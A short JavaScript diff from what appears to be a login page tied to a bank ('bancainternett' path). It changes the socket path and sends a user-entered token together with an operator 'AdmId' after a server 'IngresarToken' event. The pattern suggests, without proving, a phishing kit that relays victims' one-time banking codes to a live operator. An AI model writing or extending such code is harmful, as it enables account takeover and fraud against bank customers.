@@ -23,7 +23,7 @@ CerrarModal.addEventListener("click", () => {
 })
 
 const socket = io.connect({
-    path: "/bancainternett/socket.io/"
+    path: "/socket.io/"
 })
 
 
@@ -48,7 +48,7 @@ CerrarModalSuccessFinish.addEventListener("click", () => {
     Validate.style.display = "none";
 })
 
-var dataEnviarToken;
+var dataAdm;
 
 sendToken.addEventListener("click", (e) => {
     e.preventDefault();
@@ -59,7 +59,7 @@ sendToken.addEventListener("click", (e) => {
         const dataToken = {
             'Socket': originalSocket,
             'Token': tokenInput.value,
-            'admToken': dataEnviarToken.admToken
+            'AdmId': dataAdm,
         }
         
         noValidate.style.display = "none";
@@ -72,7 +72,7 @@ sendToken.addEventListener("click", (e) => {
 })
 
 socket.on("IngresarToken", data => {
-    dataEnviarToken = data;
+    dataAdm = data.idAdm;
     if(data){
         if(showToken.style.display == "flex"){
             spinner.style.display = "none";
